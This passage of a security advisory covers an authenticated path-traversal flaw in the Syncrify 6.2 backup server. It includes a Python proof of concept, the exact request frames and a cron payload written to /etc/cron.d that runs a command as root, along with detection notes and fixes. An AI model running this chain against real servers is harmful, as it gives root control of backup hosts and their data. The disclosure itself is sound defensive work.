web root, any path another privileged consumer later reads. We did not test that shape and we do not
claim a specific outcome from it; it is stated as argued.

### Sink Identification — sibling sinks, and whether they are proven

The same enumeration produced several related constructions. Each is reported with its status,
because a reader needs to know which of these we are asserting and which we are pointing at.

- **PublicLink browser download traversal — not proven, audit lead only.** The browser-facing
  sibling handler (`operation=pubopp`) has a download branch that base64-decodes an `fn` parameter,
  joins it to a link's folder with `new File(base, name)` and no `..` rejection, then hands the
  result to the download handler by setting two request attributes: the parent path and the final
  name. The downstream `ha.E()` / `t.G()` check inspects only the final name - a `getName()` value,
  which by construction cannot contain `..` - while the parent path attribute still carries the
  traversal. A Java-level test with the base
  `/opt/Syncrify/PublicLinks/admin/myfolder` and the name `../../../../../etc/passwd` confirmed that
  the canonical path resolves to `/etc/passwd`, that `getParent()` retains the `..` segments and that
  `getName()` yields the bare `passwd`. We did **not** demonstrate this end to end: it needs a valid
  public-link identifier, and no link existed on the instance we deployed. It is reported as a
  structural lead for the vendor, not as a finding of this advisory, and no file content was read
  through it.
- **PublicLink folder-scoped copy (`st=cip`) — examined, confined.** This branch copies into the
  user's PublicLinks folder and was not found to permit an arbitrary destination.
- **Debug-header arbitrary write — ruled out in this product.** The shared mail package carries a
  debug-header constant `X-SM_SAVE_BODY_4DEBUGGING` (`com.synametrics.commons.net.mail.k`, field
  `f`), referenced only from client-side classes at
  `com/synametrics/syncrify/client/syncribox/g.java:196` and `:207`. No server HTTP handler reads
  that header in Syncrify, so the mechanism that produced an arbitrary write in earlier research on
  a sibling product is absent from this server path. Negative finding, established by tracing
  references.
- **Command-execution sinks — none reachable anonymously.** Seventeen `Runtime.exec` /
  `ProcessBuilder` call sites exist in the tree. Eleven belong to boot, client, JRE-update,
  file-attribute or generic helper code with no network caller. Two are in network handlers and both
  are administrator-level with hardcoded argument vectors: `AdminHome.java:357` runs
  `/etc/init.d/networking restart` and `Shutdown.java:54` runs `reboot` or `halt`, neither with any
  injectable element. The generic helper (`commons/util/ja.java:34` and `:53`) is argument-vector
  only, with no shell. The one structurally interesting site is the backup job-hook executor at
  `syncrify/util/zC.java:301`, and it is blocked four ways: the `jobHookScript` configuration value
  is empty by default and only an administrator can set it (`saveConfig` at level 2), and an empty
  value returns immediately; the executable path comes from that administrator-set value and must
  already exist; execution is argument-vector with no shell; and the substituted client-address
  value comes from the container's peer address rather than from a client-supplied field, so it
  cannot be forged over TCP. Every one of those is a real constraint, and together they make the
  hook unusable as an injection point from a client.
- **Deserialization sinks — none with a network caller.** Eight candidate sites were examined: two
  generic helpers in the shared utility class (`t.java:2423-2426` and `t.java:6042-6052`) that no
  handler calls with network data; a logging socket receiver
  (`SocketReceiver.java:28` and `:44`) whose listener is only started from a CLI entry point that the
  server never invokes, confirmed by the absence of any additional listening socket; three sites that
  read local files or packaged resources (`tfa/B.java:174-175` and others); and two that are not
  deserialization at all. The in-house binary protocol (`p/H.java`, 823 lines) is length-prefixed
  field parsing with no object stream anywhere in it, and the classpath carries no gadget library -
  no `commons-collections`, Jackson, XStream, Kryo or Hessian - so there is no chain even if a sink
  were reached.
- **Template, naming and outbound-fetch sinks — negative.** No template engine and no naming-service
  lookup exist in the tree, and the only user-influenced outbound fetch belongs to an
  administrator-level debugging operation.

Of all of these, exactly one was proven: the chunk-upload write in section 5's opening table,
verified end to end with a root identity capture.

## 6. Source Identification

### Source Identification — the tainted input and its transport

The tainted value is the filename field of the chunk frame, and it travels in the request body - not
in a URL parameter, not in a header, and not in a multipart part. Concretely:

```text
POST /app?operation=pb&st=u HTTP/1.1
Cookie: JSESSIONID=<session-id>
Content-Type: application/octet-stream
Content-Length: <frame length>

[int32 protocol = 1]
[int32 chunkNumber = 1]
[int32 totalChunks = 1]
[int32 size = <body length>]
[int32 nameLength][UTF-8 filename bytes]
[body bytes, exactly `size` of them]
```

Integers are four bytes big-endian; the string is a four-byte length prefix followed by UTF-8 bytes.
The frame is read straight from `request.getInputStream()`, which means the server's parameter
parsing, form decoding and any framework-level parameter validation are all bypassed by
construction - the bytes go from the socket to the protocol reader. That transport detail is not
incidental: framework validation and parameter filters operate on `getParameter` values, and the
field that decides the write destination is not a parameter.

The request also needs a session cookie obtained from the authentication request, because the base
directory is derived from the session's `pbUser` value. The two URL parameters (`operation=pb`,
`st=u`) select the handler and the branch; neither contributes to the traversal.

### Source Identification — sanitization that exists, and what it is for

The codebase demonstrably knows how to defend this class of construction, and it does so three
different ways in three neighbouring families. Recording them is what turns "no check here" from an
absence into a defect.

- **Separator rejection.** The profile-upload, profile-fetch and file-splitter handlers inspect the
  client-supplied name for path separators by character code - `indexOf(47)` for `/` and `indexOf(92)`
  for `\` - and refuse names containing either. This is the cheapest defense and the one that catches
  the obvious case, including the traversal used here, because `../../` cannot survive it.
- **Base-name collapse.** The multipart upload path builds its destination from
  `getName()` of a constructed `File`, which discards every directory component. Its effect was
  confirmed at the Java level: constructing a file from the base `/opt/Syncrify/PublicLinks` and the
  name `../etc/cron.d/evil` and calling `getName()` returns `evil`, so the write path stays inside
  the PublicLinks root no matter what the client asked for.
- **Traversal-substring rejection.** The download path runs the name through a shared string helper
  that tests for `..` (`indexOf("..")`), and answers `404` on a match.

There is one more encoding-related mechanism in the tree that a reader might expect to be relevant
and is not. A posted-string decoder exists for form handlers that expands numeric HTML entities into
characters, which in other products creates a double-decoding question. The families above read
their values with plain `getParameter` and do not pass through that decoder, and the chunk-upload
branch does not read a parameter at all - it reads raw bytes from the stream. So there is no
decoding step between the socket and the constructor, and no way for an encoding trick to matter:
what the client puts in the frame is what the path is built from.

### Source Identification — validation that is absent

Against the sink in section 5, the following controls are all absent from the chunk-upload branch:

- No rejection of `..` in any form.
- No rejection of path separators, ASCII or otherwise.
- No collapse to a base name.
- No rejection of an absolute name, which would be a second way to leave the base directory without
  any `..` at all.
- No canonical containment test - no comparison of the resolved target against the canonical base,
  which is the property that actually matters and the only one that survives every encoding
  variation.
- No allowlist or expected-shape check on the chunk name, despite the fact that a legitimate client
  generates names within its own repository and the server already knows which repository it is.
- No limit tying the write to the folder the authenticated user actually owns: the base directory is
  chosen from the session, but the final target is chosen from the frame.
- No server-side allocation of the destination. The frame supplies a sequence number and a total
  count, which could have anchored a server-controlled reassembly contract, and both are read and
  then unused.

## 7. Data Flow

### Data Flow — end-to-end chain

```text
backup-user credential (issued by an administrator for client uploads)
   |
   | GET /app?operation=pb&u=<user>&p=<password>
   v
PublicLink.handle()  -> no st  ->  c()                      PublicLink.java:141-165
   |     gate 1: both u and p present            (else code="-1")
   |     gate 2: DefaultUserManager.fetchUserHolder(u, p) != null
   |                                             DefaultUserManager.java:283-298 (else code="-2")
   |     writes session attribute "pbUser"
   |     creates this user's PublicLinks folder: /opt/Syncrify/PublicLinks/<user>/<generated>
   |     replies code="1" OK with the generated folder name
   v
JSESSIONID returned to the caller
   |
   | POST /app?operation=pb&st=u   (Cookie: JSESSIONID, octet-stream body)
   v
PublicLink.handle()  -> st="u"  ->  f()                      PublicLink.java:1008-1022, :127
   v
upload branch                                                PublicLink.java:70-110
   |     readInt() x4      : protocol, chunkNumber, totalChunks, size
   |     readString()      : filename  = "../../../../../etc/cron.d/<name>"   <-- TAINT
   |     base              = PublicLinks folder of the session's pbUser
   |     target            = new File(base, filename)      <-- no containment check
   |     mkdirs() on target's parent
   |     new FileOutputStream(target, true)  +  write(size bytes from the body)
   v
/etc/cron.d/<name>   containing "* * * * * root <command>"
   |     file owner root, mode 0644, written by the uid-0 server process
   v
host cron daemon scans /etc/cron.d, accepts the root-owned fragment,
runs the command field through a shell as root on the next minute boundary
   |
   v
uid=0(root) gid=0(root) groups=0(root)
```

The depth arithmetic is the one part that must be computed rather than guessed. The base directory is
`/opt/Syncrify/PublicLinks/<user>/<generated-folder>`, whose components below the root are `opt`,
`Syncrify`, `PublicLinks`, `<user>` and `<generated-folder>` - five of them. Five `../` segments
therefore land at `/`, and the frame name becomes `../../../../../etc/cron.d/<name>`. A base
directory at a different depth needs a different count, which is why the proof of concept exposes
the depth as an argument rather than a constant.

### Data Flow — properties of the chain worth naming

- **The reply is a success oracle.** The chunk branch returns 0 and the caller answers
  `code="1"` with `<payload>0</payload>`. An attacker learns that the write was accepted without
  any host access, and can iterate on depth or naming from the network alone.
- **A successful reply is not proof of a successful destination.** Because the code never inspects
  the resolved path, a wrong depth still yields `code="1"` - the write simply goes somewhere else,
  with intermediate directories created as needed. This is why section 9 treats the reply as a
  necessary signal and the read-back as the only sufficient one.
- **Append mode changes the failure modes.** Repeated requests accumulate lines. An attacker does
  not need a single byte-exact write; a valid line survives later malformed ones. A defender cannot
  rely on the payload having to be perfect.
- **Destination directories are created, not required.** `mkdirs()` means the primitive is not
  limited to paths that already exist, which is what removes the usual ceiling on this class of bug.
- **The write is not atomic.** There is no write-to-temporary-then-rename step, so a partial body or
  an interrupted request can leave a truncated fragment on disk. For a job-definition directory, a
  truncated line is simply skipped by the scheduler, so this does not defeat the chain - it only
  means the state on disk can be mid-write.
- **The declared size must match the bytes sent.** The reader allocates `new byte[size]` and reads
  until full, so an inconsistency stalls or fails the read. The frame must be well-formed even
  though the name inside it need not be.
- **No shell exists inside the product.** Every execution site in the application uses an argument
  vector; the shell interpretation in this chain happens in the scheduler's parsing of the job line,
  which is why the payload is written in cron's own syntax rather than as a shell string.
- **The two requests have no timing constraint between them.** The session is the only coupling.
  There is no race to win and no window to hit, which is why this chain is reliable rather than
  probabilistic.

## 8. Exploit Construction

### Exploit Construction — step sequence

The published proof of concept (`exploit/` in this advisory directory) implements exactly the two
requests above and nothing else. Framing is four lines of code:

```python
def pack_uint32(value):
    return struct.pack(">I", value & 0xFFFFFFFF)

def pack_string(value):
    raw = value.encode("utf-8")
    return pack_uint32(len(raw)) + raw

def build_chunk(chunk_name, body):
    if isinstance(body, str):
        body = body.encode("utf-8")
    return (pack_uint32(1)                 # protocol
            + pack_uint32(1)               # chunkNumber
            + pack_uint32(1)               # totalChunks
            + pack_uint32(len(body))       # size
            + pack_string(chunk_name)      # filename, the tainted field
            + body)                        # the exact bytes to be written

def traversal_name(depth, absolute_target):
    return "/".join([".."] * depth) + "/" + absolute_target.lstrip("/")
```

The sequence is:

1. `GET <scheme>://<host>:<port>/app?operation=pb&u=<user>&p=<password>`. Require a session cookie
   in the response and an acceptance reply. The reply's payload is the generated folder name; capture
   it, because it confirms the base directory was created for this user.
2. Build the cron fragment body: one line, `<schedule> <user> <command>`, terminated by a newline.
3. Frame it with `build_chunk(traversal_name(depth, "/etc/cron.d/<name>"), body)`.
4. `POST <scheme>://<host>:<port>/app?operation=pb&st=u` with the session cookie,
   `Content-Type: application/octet-stream` and the frame as the body. Require `code="1"`.
5. Wait for the next minute boundary (a little over a minute allows for scheduler granularity), then
   read the marker back from the host.
6. With `--cleanup`, remove exactly the two paths the script created.

With `--control`, steps 1 through 4 are identical except that the chunk name carries no parent-directory
segments, so the frame writes into the user's own PublicLinks folder; step 5 is replaced by an
assertion that nothing appeared at the cron fragment path and nothing appeared at the marker path.
Because the authentication, the framing, the route and the reply are all unchanged, the control
isolates the traversal as the only difference between a benign upload and a root write.

### Exploit Construction — payload engineering constraints

Several constraints had to be satisfied for the fragment to be honoured, and they are payload
engineering rather than vulnerability conditions - a reader reproducing this should not discover them
the hard way:

- **The user field is mandatory in `/etc/cron.d`.** Job fragments in that directory take six fields
  before the command - five schedule fields plus the user to run as - unlike a personal crontab,
  which omits the user field. Omitting it makes the first token of the command be read as a user
  name and the line is discarded.
- **The file must end with a newline**, otherwise implementations that read line-wise may ignore the
  final partial line.
- **The fragment name should contain no dot.** Scheduler implementations that scan a directory
  commonly refuse names carrying one, along with the other conventions they inherit from
  run-parts-style scanners. The verified run used a dot-free name, as does the proof of concept's
  default.
- **The depth must match the base directory.** Five segments for the PublicLinks base documented
  above. One too few writes into `/opt/Syncrify/...`; one too many is clamped at the root and
  resolves to the same destination - but only because extra segments past the root are absorbed, and
  relying on that is luck rather than analysis, so the depth belongs in the argument list.
- **The declared `size` must equal the number of body bytes** sent after the name field, or the read
  does not complete.
- **The command should be self-proving and harmless.** The verified payload captured an identity into
  a marker file. A shell that persists, a script that modifies the repository or a command with side
  effects would prove less, not more, and would leave the target in a state the vendor cannot
  inspect.

### Exploit Construction — what the exploit deliberately does not do

- It does not attempt, probe or require an unauthenticated path. It refuses to run without a
  credential pair, and the pair has no default value.
- It does not use the factory administration password, does not touch the administrator store, and
  does not attempt to provision a user.
- It does not write to any product file, repository, configuration or shared folder. The single
  write goes to the path the operator names, and the default is a marker fragment plus a marker file.
- It does not delete or overwrite anything. The writer is append-only by construction, and the script
  performs no removal except under `--cleanup`, which touches only the two paths it created.
- It does not spawn a reverse shell, does not exfiltrate data, does not contact any address other
  than the target the operator supplies, and has no callback host at all.
- It does not enumerate, scan or fingerprint hosts. Its defaults are loopback addresses.
- It does not persist beyond the single fragment, and its own output tells the operator that the
  fragment keeps running until it is removed.

## 9. Dynamic Verification

### Dynamic Verification — environment

| Item | Value |
|---|---|
| Product and build | Syncrify 6.2 build 1178, `SyncrifyServer.jar` |
| Deployment | Linux tarball archive installed into `/opt/Syncrify`, started with `./run.sh` |
| Server launch line | `jre/bin/java -server -Xmx512m -cp lib/*.jar com.synametrics.sradef.BootLoader` |
| Process identity | uid 0 - established by the ownership of the file the process created, and by the scheduler's own output |
| Embedded container | Tomcat 9.0.113, `Server: Synametrics Web Server v7` |
| Listener used | Port 5800 on the loopback address - the binding was applied by us in the configuration before testing |
| Scheduler state | Cron daemon active, confirmed separately |
| Credential | A backup-user entry in `config/UserMappings.xml`, written by hand into a store that did not exist after installation; the login name and password are withheld here and are arguments to the tool |
| Tool | A parameterised Python 3 implementation using only the standard library, published in `exploit/` |
| Payload | An identity capture into a marker file - no destructive action, no persistence beyond the one fragment |
| Post-run state | The fragment and the marker were removed and the service stopped after verification |

Two entries in that table are lab properties rather than product properties and both are flagged in
section 1 and section 10: the loopback binding and the hand-written user-store entry.

### Dynamic Verification — the triggering request

The first request authenticates and returns the session identifier plus the generated folder name:

```text
GET /app?operation=pb&u=<backup-user>&p=<password> HTTP/1.1
Host: 127.0.0.1:5800

HTTP/1.1 200
Set-Cookie: JSESSIONID=<session-id>; Path=/; HttpOnly

<?xml version="1.0" encoding="UTF-8"?>
<reply>
    <response code="1">
        <message><![CDATA[OK]]></message>
        <payload><generated-folder-name></payload>
    </response>
</reply>
```

The second request carries the frame. The block below is the frame layout the tool constructs and
the field lengths it produced, derived from the field values rather than pasted from a wire capture;
the run's own byte capture was not preserved, and only the values the two endpoints exchanged are
reproduced here.

```text
POST /app?operation=pb&st=u HTTP/1.1
Host: 127.0.0.1:5800
Cookie: JSESSIONID=<session-id>
Content-Type: application/octet-stream
Content-Length: 104

<int32 protocol     = 1>                       4 bytes
<int32 chunkNumber  = 1>                       4 bytes
<int32 totalChunks  = 1>                       4 bytes
<int32 size         = 46>                      4 bytes   (matches the body below exactly)
<int32 nameLength   = 34>                      4 bytes
<UTF-8 chunk name   = ../../../../../etc/cron.d/<name>>   34 bytes
<body = "* * * * * root id > /tmp/syncrify_cron_marker\n">  46 bytes
                                              ----------
                                              104 bytes total

HTTP/1.1 200
<?xml version="1.0" encoding="UTF-8"?>
<reply>
    <response code="1">
        <message><![CDATA[OK]]></message>
        <payload>0</payload>
    </response>
</reply>
```

The two lengths in that frame are worth pointing at, because they are the cross-check that the
framing was right. The declared `size` field was 46 and the file that appeared on disk was 46 bytes,
so exactly the body was written with nothing preceding or following it. And the chunk name was 34
bytes is five parent-directory segments (15 characters) plus a 19-character relative
destination whose final component is redacted above as `<name>`, which is the depth arithmetic of
section 7 expressed in bytes.

`code="1"` with `<payload>0</payload>` is the branch's own success signal: the upload method returned
0 and `f()` reported it. Note that this reply is exactly what a legitimate chunk upload produces.
Nothing in it distinguishes a benign name from a traversing one.

### Dynamic Verification — observed output

The tool's stdout from the verified run, with the credential pair replaced by placeholders and the
generated folder name withheld because it embeds the run's timestamp. Everything else is as printed:

```text
[*] Target: http://127.0.0.1:5800
[*] User: <backup-user> / <password>
[*] Command (via cron): id > /tmp/syncrify_cron_marker
[*] Step 1: authenticating via PublicLink c() ...
[*] auth status: 200
[*] cookie: JSESSIONID=<session-id>; Path=/; HttpOnly
[*] auth body: <?xml version="1.0" encoding="UTF-8"?>

<reply>
    <response code="1">
        <message><![CDATA[OK]]></message>
        <payload><generated-folder-name></payload>
    </response>
</reply>

[+] authenticated, JSESSIONID acquired
[*] Step 2: uploading traversal chunk to /etc/cron.d via st=u ...
[*] traversal filename: ../../../../../etc/cron.d/<name>
[*] upload status: 200
[*] upload body: <?xml version="1.0" encoding="UTF-8"?>

<reply>
    <response code="1">
        <message><![CDATA[OK]]></message>
        <payload>0</payload>
    </response>
</reply>

[+] upload succeeded, /etc/cron.d/<name> written
[+] crond will execute as root within ~60s
[+] verify: read /tmp/syncrify_cron_marker on the target host
[+]         expect: uid=0(root) gid=0(root) groups=0(root)
```

The host-side artifacts are what turns that reply into evidence. Each proves a distinct step, and
they are listed in the order the chain depends on them:

```text
$ ls -la /etc/cron.d/<name>
-rw-r--r-- 1 root root 46 <timestamp columns omitted> /etc/cron.d/<name>

$ cat /etc/cron.d/<name>
* * * * * root id > /tmp/syncrify_cron_marker

$ systemctl is-active crond
active

$ cat /tmp/syncrify_cron_marker
uid=0(root) gid=0(root) groups=0(root)
```

What each line establishes:

- The listing proves the write left the repository tree and landed in the scheduler directory, that
  the process which created it held uid 0 (owner `root`), and that its mode was `0644` - the
  combination a scheduler requires before it will honour a fragment.
- The size, 46 bytes, is a cross-check worth stating because it closes a possible objection: it is
  exactly the length of the single job line plus its terminating newline, so no other content
  preceded or followed it. One request produced one line and nothing else.
- The content proves the attacker-chosen bytes arrived intact, including the `root` user field.
- The scheduler state proves the host would act on the directory rather than ignoring it.
- The marker proves execution, and its content proves the identity - uid 0, not the identity of a
  service account and not the identity of the account whose credential was used.

### Dynamic Verification — the negative control and why it matters

A traversal claim without a control is weak, because the same reply could in principle mean the file
went somewhere harmless. Four controls were exercised, and the published tool automates one of them.

- **Traversing versus non-traversing name, same session, same route.** This is the `--control` mode:
  identical authentication, identical framing, identical route and reply shape, with a chunk name
  that carries no parent-directory segments. The write is accepted and lands inside the user's own
  PublicLinks folder, and the subsequent assertion is that neither the cron fragment path nor the
  marker path exists. Because nothing else differs between the two runs, the difference in outcome is
  attributable to the traversal in the name and to nothing else.
- **Sibling-handler control.** The multipart upload family in the same product, which collapses the
  client-supplied name with `getName()`, was tested at the Java level with a traversing name against
  the same PublicLinks base: the collapse returned the bare final component and the resulting write
  path stayed inside the PublicLinks root. Same product, same base directory, same kind of hostile
  input, no traversal - because that handler has the defense this one lacks.
- **Dispatch control.** A request built against the other `st` value (`st=f`) reached the overload
  that parses a `Long` parameter and produced no file anywhere. This is the control that caught the
  overload mapping error described in section 5: the absence of a write under `st=f` and its presence
  under `st=u` is what fixes the sink to the branch we are reporting, rather than to the handler in
  general.
- **Authentication controls.** The four-way reply table in section 3: correct credential accepted,
  wrong password rejected with code `-2`, absent password rejected with code `-1`, absent user
  rejected with code `-1`. Together these show that the credential gate is live and that the
  no-comparison branch inside the credential fetch is unreachable from this surface.

### Dynamic Verification — boundaries of what was verified

Stated as boundaries, not caveats:

- One instance, one build (6.2 build 1178), one operating system shape. No other version, edition or
  platform was exercised, so nothing is claimed about them.
- The chain was driven over the loopback address from the target host itself, because that is how the
  listener was bound in our instance. We did not verify the same chain arriving from across a network
  segment, and we do not claim to have. What we claim is that the route was served by that listener
  and that the requests and responses in this section are what it produced.
- The credential used was in the plaintext-comparison branch of the store. The encrypted-entry branch
  and the directory-authentication branches were examined statically and not exercised.
- The account entry was created by hand in a store that did not exist after installation; the
  administrator provisioning path was not used, because it is licence-gated and the licence count was
  zero. The sink's gate does not distinguish between these, but only one of them has a live run
  behind it.
- Root execution was observed, not inferred. A non-root service deployment was not tested, so no
  claim is made about what the write primitive achieves in that shape.
- The payload was an identity capture into a marker file. No data was read from any repository, no
  product file was modified, and the fragment and marker were deleted after verification together
  with stopping the service. The tool ships the same behaviour and exposes it as `--cleanup`.
- The proof of concept in `exploit/` is a rewrite of the verification tool with argument handling and
  a control mode; the transcripts above are from the run that established the finding.

## 10. Reachability and Security Impact

### Reachability and impact — network position

This is the judgement that decides whether the rest of the advisory is worth trusting, so it is
stated with its evidence and its gaps separated.

**What was established.** The route that carries the vulnerability - `POST /app?operation=pb&st=u` -
was served by the main web listener on port 5800 in our instance, and every request in section 9 went
to `http://127.0.0.1:5800`. That listener is where the front controller lives: `/` answers `302` with
`Location: /app`, the server identifies itself as `Synametrics Web Server v7`, and the same listener
was where all forty-seven level-0 operations were probed during enumeration, including the
client-protocol operations that backup clients use.

**What was ours.** That listener was bound to the loopback address because we set
`httpIP=127.0.0.1` in the configuration before testing, so that the host carried no public exposure
while research was in progress. It is a lab hardening step, not an observed product default.

**What is not established.** We hold no shipped artifact - no configuration template, no installer
script excerpt, no documentation quotation - that states the factory value of that binding. Our own
deployment notes phrase the exposure question conditionally rather than as a settled fact. So the
correct statement is that the shipped default binding of the listener carrying this route is
unknown to us, in either direction.

**What the other listeners show.** Two listeners were world-bound in our instance: the 52110 HTTP
status endpoint, which answered with the server version and build, active HTTP sessions and job
status; and the 27000 accelerated-transfer channel over TCP and UDP. Neither was observed to serve
the `/app` front controller, so neither is offered here as a demonstrated remote entry point to this
sink. A third listener (54222) is a secondary failure-over HTTP endpoint and was likewise loopback
in our instance.

**What the design implies, and what we therefore rate.** Syncrify is a network backup server whose
client machines authenticate with credentials from the backup-user store and push data over HTTP to
this same front controller. In any deployment where clients back up to the server across a network,
the listener that carries `operation=pb` must be reachable from those clients - otherwise the
product cannot perform its function. That is a structural argument about the product's design, and it
is why `AV:N` is the honest classification of the component: this is an HTTP handler on a
network-bound servlet connector, and the principal it accepts is a principal that exists to be
remote. It is not a local code path, not a file-format bug, and not something reachable only through
local execution.

The deployment-dependent part is priced in attack complexity rather than smuggled into the attack
vector. `AC:H` in the primary vector carries two conditions outside the attacker's control: that the
listener carrying this route be reachable from the attacker's position, and that the host run a
scheduler that scans `/etc/cron.d`. The conditional reading removes the first - and, on a
conventional Linux server, the second - by assuming a deployment in which the portal listener is
reachable from where the attacker sits, which is how a backup server normally operates for remote
clients. That conditional figure is labelled conditional everywhere it appears and never becomes the
headline.

A reader who prefers to treat our loopback binding as the product's default should read section 12's
rejected `AV:L` entry: it is published with its score, it is higher than the figure we chose, and the
reason we rejected it is that the binding is not artifact-established rather than that it is
inconvenient.

### Reachability and impact — what the achieved identity controls

Root on a backup server is a poor prize for an attacker and a bad day for the operator, and the two
are the same fact. The identity reached controls:

- **Every stored backup repository.** The server holds copies of what its clients contain: home
  directories, source trees, database exports, configuration stores, archived mail. Root reads all
  of it, including repositories belonging to other backup users, which is a confidentiality breach
  across every tenant of the server rather than within one account.
- **The server's own credential and configuration material.** The administrator store
  (`config/umap.dat`), the backup-user store (`config/UserMappings.xml`, whose entries are compared
  in plaintext or stored under a reversible permutation transform), runtime and static configuration,
  transport material, and any directory-authentication or mail configuration present. The
  plaintext-comparison design means a read of that store hands over credentials directly.
- **The host.** Root can install persistence by any of the ordinary mechanisms, modify the package
  set, adjust kernel and firewall settings, read `/etc/shadow`, and move laterally to whatever the
  host can reach - which for a backup server is typically every machine that is configured to back up
  to it, since those clients hold network paths and credentials pointing at this host.
- **Integrity of the backup chain.** Repository contents, version and retention metadata and the
  server's own binaries can all be altered in place. A modified backup set is a failure that is
  invisible until the moment the data is needed, which is the specific property that makes this class
  of control expensive to lose.
- **Availability.** The service can be stopped, the host rebooted or hung, repositories deleted or
  truncated, and the scheduler used to keep doing so after remediation of the application alone.

### Reachability and impact — the unauthenticated question, answered in full

We looked for an unauthenticated path to this sink, did not find one, and say so plainly. The
positive content of that claim is the enumeration, so the enumeration is reproduced rather than only
its conclusion.

- **Thirteen operations answer anonymous requests with real content and no credential check.** Each
  was probed without credentials and each was then traced into its handler code for a sink. All
  thirteen are sink-free: they return a build number, a login page, a footer, a chart, a captcha
  image, an about page, click tracking, a newsletter page, a client download, a client-information
  page and similar read-only or static content. The only user-controlled parameter among them that
  reaches a function at all is the e-mail address passed to the password-recovery operation, which is
  used as a lookup key rather than as a destination; the recovery message goes to the address already
  registered for that account, so it is an enumeration weakness (CWE-203) and not a write or
  execution route.
- **The remaining level-0 operations are not anonymous.** In this framework, `secLevel=0` means "no
  administrator session required", which is correct by design for client-protocol operations. The
  handlers authenticate internally against the backup-user store and answer `-2 ERROR` without valid
  credentials. Treating level 0 as unauthenticated would overstate this product's exposure by a
  factor of about three.
- **The backup protocol's authentication gate held.** The gate is a two-part construction - the
  parameter-presence test followed by the credential lookup - and each part was examined and then
  probed. The lookup's password-less branch, which would be a bypass if it were reachable, is not
  reachable from HTTP because the presence test runs first; the ordering was verified by the
  distinguishable reply codes rather than assumed from the decompilation. No backup-user account
  exists after a clean installation, so there is no default credential to use. The session attribute
  the upload branch depends on is written only by the authentication method after a successful
  lookup, so it cannot be forged into existence from the outside.
- **Execution and deserialization surfaces were exhausted with negative results.** Seventeen
  command-execution sites, none reachable anonymously (section 5). Eight deserialization candidates,
  none with a network caller, and no gadget library on the classpath. No template engine and no
  naming-service lookup exist anywhere in the tree. The only user-influenced outbound fetch belongs
  to an administrator-level operation. No exploitable check-then-use window was found in the
  unauthenticated file operations.

Two things must be said about what that enumeration does not mean. First, it is not a proof that the
unauthenticated surface is safe; it is a report that we could not find a route to a write, execution
or traversal sink within the operations we could identify, using three independent enumeration
directions. Second, the enumeration did surface weaknesses that are real and are deliberately not
claimed here: a filter-block bypass that exposes debug pages shipped in the web root via a
`manualOverride` parameter, yielding a directory listing and an environment-variable dump
(`WebFilter.java:54`; CWE-284 with CWE-200 and CWE-209); the password-recovery enumeration above;
globally disabled CSRF prevention; and vendor-default database credentials for an embedded database
that is disabled and was not listening. Each is out of scope for this advisory, none is part of the
chain, and none is used to raise a metric here.

### Reachability and impact — detection notes

Detection has to come from outside the application, because the application considers every step of
this chain to have succeeded.

- **Application logs will not show it.** The chunk branch performs no path logging, produces no
  rejection, and returns the same acceptance reply a legitimate client receives. There is no
  application-level signal to alert on.
- **Access logs give weak signal only.** A chunk-upload request looks like ordinary client traffic;
  the only anomaly is that a real backup session issues a long sequence of such requests while this
  chain issues one or two, often with a very small body. A request pattern of authenticate-then-
  upload-one-small-chunk with no further protocol activity is unusual for a backup client.
- **Filesystem integrity monitoring is the reliable control.** Alert on creation or modification
  under `/etc/cron.d`, `/etc/crontab`, `/var/spool/cron`, the init system's unit directories and the
  service's own binary and configuration paths, and alert specifically on any file in a scheduler
  directory whose content matches a job line with a user field of `root`.
- **The PublicLinks tree is worth auditing.** Legitimate content there corresponds to shared folders.
  Files whose names or locations do not correspond to shared content, and folders created for a user
  who has not used the share feature, are both cheap things to notice.
- **Scheduler and authentication logs correlate the two halves.** The scheduled command's execution
  appears in the scheduler's log with its parent context; a job whose command references a path under
  a temporary directory is a reasonable alert on its own.
- **Credential hygiene is a detection control here as well as a mitigation.** Each backup-user
  credential is a potential root write, so unexpected accounts in the backup-user store, and accounts
  created without a corresponding client deployment, both deserve review.

## 11. Fix Recommendations

### Fix Recommendations — vendor-side, ordered by root cause

The ordering is by root cause rather than by effort, because the first item removes the class and the
later items remove the conditions that made this instance escalate.

1. **Reject or confine the chunk name at the sink.** In the chunk-upload branch, validate the
   filename before it reaches the file constructor: refuse any value containing `/`, `\` or `..`,
   refuse any absolute value, and reduce what remains to a single path component. The tree already
   implements the separator check in three other handlers, so this is convergence on an existing
   internal pattern rather than new design.
2. **Add canonical containment after construction.** Resolve the target with `getCanonicalFile()` and
   require that it lies inside the canonical base directory for that authenticated user, with a
   separator as the boundary character. Containment is the property that survives every encoding and
   every absolute-name variation; name-based rejection alone does not. A sketch of the corrected
   construction:

```java
File base   = userFolder(pbUser);                       // from session state only
File target = new File(base, stripToBaseName(filename));
if (!target.getCanonicalPath()
        .startsWith(base.getCanonicalPath() + File.separator)) {
    displayAnswer(-1, "ERROR", "invalid chunk name");
    return;                                             // and log the rejection with the raw name
}
```

3. **Stop creating client-named directories.** The `mkdirs()` call on the resolved target's parent
   lets a client materialise directory structure anywhere the service identity can write. Create the
   destination once from server-side state, and refuse requests whose resolved target is not already
   inside it.
4. **Make chunk placement server-controlled.** The frame already carries a chunk number and a total
   count that the branch ignores. Use them: allocate the destination from session state, verify the
   sequence, stage reassembly in a directory that no scheduler, service manager, shell profile or
   startup mechanism consumes, and move the completed file into place under a server-generated name.
   This removes the ability of any client field to influence the final path.
5. **Do not run the service as root.** Drop to a dedicated unprivileged account with write access
   limited to the repository and PublicLinks subtrees. On its own this converts arbitrary root write
   into arbitrary service-account write, which removes the escalation demonstrated here but not the
   write primitive - so it is defence in depth, not the fix, and it is listed after the containment
   items for that reason.
6. **Audit the same construction across the framework.** The front controller, the handler registry
   and the shared helper library are common to the vendor's sibling products, and this build's own
   `web.xml` still carries `display-name` `SynaMan`. Every place in the framework where a filesystem
   path is built from a client-supplied field deserves the containment review described in items 1
   through 4 - in this product and in the others that share the code. We did not test those products
   and make no claim about them; the point is that the root cause is framework-shaped.
7. **Add a defence-in-depth constraint at the container.** The shipped `web.xml` security constraint
   covers only `DELETE`, `OPTIONS` and `PUT`, and says so loudly at load time; its own message states
   that all other methods are uncovered. A constraint covering the application as a whole, with
   handler-level exemptions declared explicitly rather than implied by omission, would make a
   misregistered or missing level survivable instead of fatal.
8. **Ship a regression test for the class.** Post chunks whose names are `../../../../etc/cron.d/x`,
   `/etc/cron.d/x`, a URL-encoded traversal, a name with a trailing separator, and a name with more
   `../` segments than the repository depth; assert that each is rejected and that no file appears
